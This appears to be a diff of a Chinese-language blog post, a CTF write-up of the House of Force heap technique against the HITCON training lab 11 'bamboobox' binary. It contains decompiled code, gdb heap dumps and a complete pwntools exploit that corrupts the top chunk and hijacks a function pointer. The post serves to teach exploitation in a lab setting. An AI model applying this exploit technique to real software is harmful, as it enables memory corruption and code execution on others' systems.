@@ -6,16 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://Al0nez.github.io">
-  <title>Archives | yilia</title>
+  <title>House of Force | yilia</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="yilia">
-<meta property="og:url" content="https://al0nez.github.io/archives/index.html">
+  <meta name="description" content="关于House of Force的原理，可以看一下CTF WIKI，我这里就不详细讲了，直接上例题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House of Force">
+<meta property="og:url" content="https://al0nez.github.io/2021/09/09/House-of-Force/index.html">
 <meta property="og:site_name" content="yilia">
+<meta property="og:description" content="关于House of Force的原理，可以看一下CTF WIKI，我这里就不详细讲了，直接上例题。">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-09-09T12:33:18.000Z">
+<meta property="article:modified_time" content="2021-09-09T13:20:49.140Z">
 <meta property="article:author" content="Al0nez">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="yilia" type="application/atom+xml">
@@ -204,41 +209,118 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-House-of-Force" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2021/09/09/House-of-Force/" class="archive-article-date">
-        <time datetime="2021-09-09T12:33:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-09</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2021/09/09/House-of-Force/">House of Force</a>
-	
+    <h1 class="article-title" itemprop="name">
+      House of Force
     </h1>
   
 
 
-        <div class="article-info info-on-right">
-          
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2021/09/09/House-of-Force/" class="archive-article-date">
+        <time datetime="2021-09-09T12:33:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-09</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.3k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">7分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>关于<code>House of Force</code>的原理，可以看一下CTF WIKI，我这里就不详细讲了，直接上例题。</p>
+<span id="more"></span>
+
+<h3 id="HITCON-training-lab-11"><a href="#HITCON-training-lab-11" class="headerlink" title="HITCON training lab 11"></a>HITCON training lab 11</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; // [sp+8h] [bp-18h]@1</span><br><span class="line">  char buf; // [sp+10h] [bp-10h]@2</span><br><span class="line">  __int64 v5; // [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  v3 = malloc(0x10uLL);</span><br><span class="line">  *v3 = hello_message;</span><br><span class="line">  v3[1] = goodbye_message;</span><br><span class="line">  (*v3)(16LL, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    switch ( atoi(&amp;buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        show_item();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        add_item();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        change_item();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        remove_item();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        (v3[1])(&amp;buf, &amp;buf);</span><br><span class="line">        exit(0);</span><br><span class="line">        return;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;invaild choice!!!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="add-item函数如下："><a href="#add-item函数如下：" class="headerlink" title="add_item函数如下："></a>add_item函数如下：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 add_item()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax@3</span><br><span class="line">  __int64 v1; // rcx@12</span><br><span class="line">  signed int i; // [sp+4h] [bp-1Ch]@4</span><br><span class="line">  int v3; // [sp+8h] [bp-18h]@2</span><br><span class="line">  char buf; // [sp+10h] [bp-10h]@2</span><br><span class="line">  __int64 v5; // [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  if ( num &gt; 99 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;the box is full&quot;);</span><br><span class="line">LABEL_11:</span><br><span class="line">    result = 0LL;</span><br><span class="line">    goto LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Please enter the length of item name:&quot;);</span><br><span class="line">  read(0, &amp;buf, 8uLL);</span><br><span class="line">  v3 = atoi(&amp;buf);</span><br><span class="line">  if ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 99; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !*&amp;itemlist[4 * i + 2] )</span><br><span class="line">      &#123;</span><br><span class="line">        itemlist[4 * i] = v3;</span><br><span class="line">        *&amp;itemlist[4 * i + 2] = malloc(v3);</span><br><span class="line">        printf(&quot;Please enter the name of item:&quot;);</span><br><span class="line">        *(*&amp;itemlist[4 * i + 2] + read(0, *&amp;itemlist[4 * i + 2], v3)) = 0;</span><br><span class="line">        ++num;</span><br><span class="line">        goto LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    goto LABEL_11;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;invaild length&quot;);</span><br><span class="line">  result = 0LL;</span><br><span class="line">LABEL_12:</span><br><span class="line">  v1 = *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="show-item函数如下："><a href="#show-item函数如下：" class="headerlink" title="show_item函数如下："></a>show_item函数如下：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int show_item()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax@2</span><br><span class="line">  signed int i; // [sp+Ch] [bp-4h]@3</span><br><span class="line"></span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 99; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *&amp;itemlist[4 * i + 2] )</span><br><span class="line">        printf(&quot;%d : %s&quot;, i, *&amp;itemlist[4 * i + 2]);</span><br><span class="line">    &#125;</span><br><span class="line">    result = puts(byte_401089);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="change-item函数如下："><a href="#change-item函数如下：" class="headerlink" title="change_item函数如下："></a>change_item函数如下：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 change_item()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ST08_4@4</span><br><span class="line">  int v2; // [sp+4h] [bp-2Ch]@3</span><br><span class="line">  char buf; // [sp+10h] [bp-20h]@3</span><br><span class="line">  char nptr; // [sp+20h] [bp-10h]@4</span><br><span class="line">  __int64 v5; // [sp+28h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of item:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v2 = atoi(&amp;buf);</span><br><span class="line">    if ( *&amp;itemlist[4 * v2 + 2] )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Please enter the length of item name:&quot;, &amp;buf);</span><br><span class="line">      read(0, &amp;nptr, 8uLL);</span><br><span class="line">      v0 = atoi(&amp;nptr);</span><br><span class="line">      printf(&quot;Please enter the new name of the item:&quot;, &amp;nptr);</span><br><span class="line">      *(*&amp;itemlist[4 * v2 + 2] + read(0, *&amp;itemlist[4 * v2 + 2], v0)) = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="remove-item函数如下："><a href="#remove-item函数如下：" class="headerlink" title="remove_item函数如下："></a>remove_item函数如下：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 remove_item()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [sp+Ch] [bp-14h]@3</span><br><span class="line">  char buf; // [sp+10h] [bp-10h]@3</span><br><span class="line">  __int64 v3; // [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of item:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v1 = atoi(&amp;buf);</span><br><span class="line">    if ( *&amp;itemlist[4 * v1 + 2] )</span><br><span class="line">    &#123;</span><br><span class="line">      free(*&amp;itemlist[4 * v1 + 2]);</span><br><span class="line">      *&amp;itemlist[4 * v1 + 2] = 0LL;</span><br><span class="line">      itemlist[4 * v1] = 0;</span><br><span class="line">      puts(&quot;remove successful!!&quot;);</span><br><span class="line">      --num;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="magic函数如下："><a href="#magic函数如下：" class="headerlink" title="magic函数如下："></a>magic函数如下：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void __noreturn magic()</span><br><span class="line">&#123;</span><br><span class="line">  int fd; // ST0C_4@1</span><br><span class="line">  char buf; // [sp+10h] [bp-70h]@1</span><br><span class="line">  __int64 v2; // [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  fd = open(&quot;./flag&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 0x64uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  printf(&quot;%s&quot;, &amp;buf);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>1.首先申请一个chunk1，为覆盖<code>top chunk</code>做准备。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/10gx 0x175c000</span><br><span class="line">0x175c000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x175c010:	0x0000000000400896	0x00000000004008b1     &lt;----hello_message，goodbye_message</span><br><span class="line">0x175c020:	0x0000000000000000	0x0000000000000041     &lt;----chunk1_size</span><br><span class="line">0x175c030:	0x0000000a61616464	0x0000000000000000</span><br><span class="line">0x175c040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">gdb-peda$ </span><br><span class="line">0x175c050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x175c060:	0x0000000000000000	0x0000000000020fa1     &lt;----top chunk</span><br><span class="line">0x175c070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x175c080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x175c090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>2.溢出覆盖<code>top chunk</code>的size位为0xffffffffffffffff，也就是-1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/10gx 0x1028020</span><br><span class="line">0x1028020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1028030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1028040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1028050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1028060:	0x6161616161616161	0xffffffffffffffff   &lt;----top chunk</span><br></pre></td></tr></table></figure>
+
+<p>此时<code>top chunk</code>位置<code>0x1a7c060</code></p>
+<p>3.我们要覆盖的地址是<code>0x1a7c010</code>，所以我们申请的chunk就是：<code>0x1a7c010-0x10-0x1a7c060=-0x60</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   Check if a request is so large that it would wrap around zero when</span><br><span class="line">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="line">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define REQUEST_OUT_OF_RANGE(req)                                              \</span><br><span class="line">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br><span class="line">/* pad request bytes into a usable size -- internal version */</span><br><span class="line">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="line">#define request2size(req)                                                      \</span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line">/*  Same, except also perform argument check */</span><br><span class="line"></span><br><span class="line">#define checked_request2size(req, sz)                                          \</span><br><span class="line">    if (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="line">        __set_errno(ENOMEM);                                                   \</span><br><span class="line">        return 0;                                                              \</span><br><span class="line">    &#125;                                                                          \</span><br><span class="line">    (sz) = request2size(req);</span><br></pre></td></tr></table></figure>
+
+<p>这里先要过掉第一个检查， <code>-2*MINSIZE</code>，可以pass,接下来要让我们的<br><code>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</code> 刚好等于=-60<br>所以要减掉个<code>SIZE_SZ</code>, -68就是malloc大小了</p>
+<p>4.我们再malloc一次就可以了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap</span><br><span class="line">0x1bb6000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x21, </span><br><span class="line">  fd = 0x400d49 &lt;magic&gt;,     &lt;----可以看到已经修改成功了，退出一下就可以了。</span><br><span class="line">  bk = 0x400d49 &lt;magic&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x39</span><br><span class="line">&#125;</span><br><span class="line">0x1bb6020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x39, </span><br><span class="line">  fd = 0x6161616161616161, </span><br><span class="line">  bk = 0x6161616161616161, </span><br><span class="line">  fd_nextsize = 0x6161616161616161, </span><br><span class="line">  bk_nextsize = 0x6161616161616161</span><br><span class="line">&#125;</span><br><span class="line">0x1bb6058 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x6161616161616161, </span><br><span class="line">  size = 0x6161616161616161, </span><br><span class="line">  fd = 0xffffffffffffa1, </span><br><span class="line">  bk = 0xa, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = process(&#x27;./bamboobox&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def additem(length, name):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def modify(idx, length, name):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def remove(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;4&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = 0x400d49</span><br><span class="line"># we must alloc enough size, so as to successfully alloc from fake topchunk</span><br><span class="line">additem(0x30, &quot;ddaa&quot;)  # idx 0</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">payload = 0x30 * &#x27;a&#x27;  # idx 0&#x27;s content</span><br><span class="line">payload += &#x27;a&#x27; * 8 + p64(0xffffffffffffffff)  # top chunk&#x27;s prev_size and size</span><br><span class="line"># modify topchunk&#x27;s size to -1</span><br><span class="line">modify(0, 0x41, payload)</span><br><span class="line"></span><br><span class="line"># top chunk&#x27;s offset to heap base</span><br><span class="line">offset_to_heap_base = -(0x40 + 0x20)</span><br><span class="line">malloc_size = offset_to_heap_base - 0x8</span><br><span class="line">additem(malloc_size, &quot;dada&quot;)</span><br><span class="line"></span><br><span class="line">additem(0x10, p64(magic) * 2)</span><br><span class="line">print r.recv()</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">r.sendline(&#x27;5&#x27;)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/#hitcon-training-lab-11">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/#hitcon-training-lab-11</a></p>
+
+    
+
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          Al0nez
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://Al0nez.github.io/2021/09/09/House-of-Force/" title="House of Force" target="_blank">https://Al0nez.github.io/2021/09/09/House-of-Force/</a>
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -250,7 +332,7 @@
 		</ul>
 	</div>
 
-          
+    
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -263,49 +345,66 @@
 	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2021/09/06/hello-world/" class="archive-article-date">
